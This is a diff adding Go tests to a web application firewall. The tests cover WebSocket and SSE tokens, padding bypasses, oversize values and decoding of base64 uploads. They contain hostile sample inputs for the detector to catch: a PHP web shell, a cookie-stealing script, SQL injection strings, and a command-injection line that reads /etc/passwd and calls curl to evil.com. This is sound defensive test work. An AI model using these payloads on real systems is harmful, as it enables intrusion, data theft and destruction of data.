@@ -23,6 +23,7 @@ package gwaf_test
 //     firewalls.
 
 import (
+	"encoding/base64"
 	"fmt"
 	"strings"
 	"testing"
@@ -1231,5 +1232,187 @@ func TestUploadPolyglotIsCaught(t *testing.T) {
 
 	if d := tx.ProcessRequestBody(); !d.Blocked() {
 		t.Error("script embedded in an uploaded image was not detected")
+	}
+}
+
+// ---- long-lived connections and encoded payloads ----------------------------
+
+// TestWebSocketAndSSEAreNotBlocked covers traffic that cannot use headers.
+//
+// Browsers cannot set headers on a WebSocket or EventSource connection, so a
+// bearer token in a query parameter is not a workaround — it is the only
+// option. A firewall that treats a long opaque token as suspicious breaks every
+// real-time feature in the product.
+func TestWebSocketAndSSEAreNotBlocked(t *testing.T) {
+	w := newWAF(t)
+
+	longToken := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." +
+		strings.Repeat("aGVsbG8td29ybGQtdGhpcy1pcy1hLXRva2VuLXBheWxvYWQ", 40) +
+		".c2lnbmF0dXJl_x1-Y2"
+
+	cases := []struct {
+		name    string
+		target  string
+		headers map[string]string
+		args    map[string]string
+	}{
+		{"websocket upgrade", "/ws", map[string]string{
+			"Upgrade": "websocket", "Connection": "Upgrade",
+			"Sec-WebSocket-Key":        "dGhlIHNhbXBsZSBub25jZQ==",
+			"Sec-WebSocket-Version":    "13",
+			"Sec-WebSocket-Protocol":   "graphql-transport-ws, json",
+			"Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
+			"Origin":                   "https://app.example.com",
+		}, nil},
+		{"websocket token in query", "/ws", map[string]string{
+			"Upgrade": "websocket", "Connection": "Upgrade",
+			"Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+		}, map[string]string{"token": longToken}},
+		{"sse", "/v1/events", map[string]string{
+			"Accept": "text/event-stream", "Cache-Control": "no-cache",
+			"Last-Event-ID": "42",
+		}, nil},
+		{"sse token in query", "/v1/events", map[string]string{
+			"Accept": "text/event-stream",
+		}, map[string]string{"access_token": longToken}},
+	}
+
+	for _, tt := range cases {
+		t.Run(tt.name, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("GET", tt.target, "HTTP/1.1")
+			for k, v := range tt.headers {
+				tx.AddRequestHeader(k, v)
+			}
+			for k, v := range tt.args {
+				tx.AddArgument(k, v)
+			}
+			if d := tx.ProcessRequestHeaders(); d.Blocked() {
+				t.Errorf("blocked: rule=%d msg=%q reason=%v detail=%q",
+					d.RuleID(), d.Message(), d.Reason(), d.Detail())
+			}
+		})
+	}
+}
+
+// TestPayloadPastValueLimitIsNotSkipped is the regression test for a real
+// bypass: values over the per-value ceiling used to be silently truncated, so a
+// payload placed after enough padding was never inspected and the request was
+// reported clean.
+//
+// docs/PERFORMANCE.md §4 forbids exactly this — "half-inspection is
+// indistinguishable from a bypass" — and the code was doing it anyway.
+func TestPayloadPastValueLimitIsNotSkipped(t *testing.T) {
+	w := newWAF(t)
+	payload := "1' OR 1=1-- UNION SELECT password FROM users"
+
+	for _, pad := range []int{1 << 10, 64 << 10, 200 << 10, 1 << 20} {
+		t.Run(fmt.Sprintf("pad=%dKiB", pad>>10), func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("GET", "/search", "HTTP/1.1")
+			tx.AddArgument("q", strings.Repeat("A", pad)+payload)
+
+			d := tx.ProcessRequestHeaders()
+			if !d.Blocked() {
+				t.Errorf("payload after %d bytes of padding was not inspected — "+
+					"prepending filler must not hide a payload", pad)
+			}
+		})
+	}
+}
+
+// TestOversizeValueIsReportedNotTruncated checks the other half: a value gwaf
+// genuinely will not inspect is a decision, so the deployment's fail mode
+// applies rather than the request being reported clean.
+func TestOversizeValueIsReportedNotTruncated(t *testing.T) {
+	w := newWAF(t, gwaf.WithLimits(gwaf.Limits{MaxValueLen: 1024}))
+
+	tx := w.NewTransaction()
+	defer tx.Close()
+
+	tx.SetRequestLine("GET", "/search", "HTTP/1.1")
+	tx.AddArgument("q", strings.Repeat("a", 4096))
+
+	d := tx.ProcessRequestHeaders()
+	if !d.Blocked() {
+		t.Error("an uninspected value was reported as clean")
+	}
+	if d.Reason() != gwaf.ReasonLimit {
+		t.Errorf("Reason() = %v, want ReasonLimit", d.Reason())
+	}
+	if d.Detail() == "" {
+		t.Error("no detail explaining which value was too large")
+	}
+}
+
+// TestBase64EncodedPayloadsAreDecoded covers the encoded-upload path.
+//
+// Base64 is encoded binary: inspecting it as prose costs a great deal and finds
+// nothing, and skipping it is a coverage hole because the origin decodes it.
+// A base64-encoded web shell inside a JSON field is a real technique.
+func TestBase64EncodedPayloadsAreDecoded(t *testing.T) {
+	w := newWAF(t)
+
+	payloads := []string{
+		"<?php system($_GET['cmd']); ?> and some padding to make it long enough",
+		"<script>alert(document.cookie)</script> plus padding text for length",
+		"1 UNION SELECT password FROM users WHERE id=1 -- padding text here",
+		"'; DROP TABLE users; -- padding to reach a reasonable length here",
+		"x; cat /etc/passwd && curl http://evil.com/ -- padding for length",
+	}
+
+	for _, p := range payloads {
+		t.Run(p[:min(len(p), 30)], func(t *testing.T) {
+			enc := base64.StdEncoding.EncodeToString([]byte(p))
+
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("POST", "/v1/certs/upload", "HTTP/1.1")
+			tx.AddRequestHeader("Content-Type", "application/json")
+			tx.ProcessRequestHeaders()
+			tx.SetRequestBody([]byte(`{"filename":"x.txt","data":"` + enc + `"}`))
+
+			if d := tx.ProcessRequestBody(); !d.Blocked() {
+				t.Errorf("base64-encoded payload was not decoded and inspected: %q", p)
+			}
+		})
+	}
+}
+
+// TestBase64BodiesAreCheap guards the cost side. Before decoding, a 700 KiB
+// base64 field burned 20 million fuel — 62% of the default budget — for one
+// upload, because the detectors were reading encoded binary as prose.
+func TestBase64BodiesAreCheap(t *testing.T) {
+	w := newWAF(t)
+
+	raw := make([]byte, 256<<10)
+	for i := range raw {
+		raw[i] = byte(i*7 + i/251)
+	}
+	enc := base64.StdEncoding.EncodeToString(raw)
+
+	tx := w.NewTransaction()
+	defer tx.Close()
+
+	tx.SetRequestLine("POST", "/v1/certs/upload", "HTTP/1.1")
+	tx.AddRequestHeader("Content-Type", "application/json")
+	tx.ProcessRequestHeaders()
+	tx.SetRequestBody([]byte(`{"data":"` + enc + `"}`))
+
+	if d := tx.ProcessRequestBody(); d.Blocked() {
+		t.Fatalf("benign base64 upload blocked: rule=%d", d.RuleID())
+	}
+
+	// Generous, but far below the ~7.3M this cost before decoding.
+	const maxFuel = 500_000
+	if got := tx.FuelSpent(); got > maxFuel {
+		t.Errorf("a %d KiB base64 upload cost %d fuel, want under %d — "+
+			"encoded binary is being read as prose again",
+			len(enc)>>10, got, maxFuel)
 	}
 }
